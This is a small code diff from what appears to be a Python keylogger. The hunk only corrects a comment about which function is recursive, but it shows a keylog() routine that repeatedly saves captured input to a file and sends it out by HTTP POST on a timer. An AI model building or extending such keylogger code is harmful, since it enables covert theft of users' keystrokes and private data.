@@ -40,7 +40,7 @@ def send_post_req():
 def keylog():
     send_post_req()
     add_to_file()
-    # Setting up a timer function to run every <time_interval> specified seconds. send_post_req is a recursive function, and will call itself as long as the program is running.
+    # Setting up a timer function to run every <time_interval> specified seconds. keylog is a recursive function, and will call itself as long as the program is running.
     timer = threading.Timer(time_interval, keylog)
     # We start the timer thread.
     timer.start()
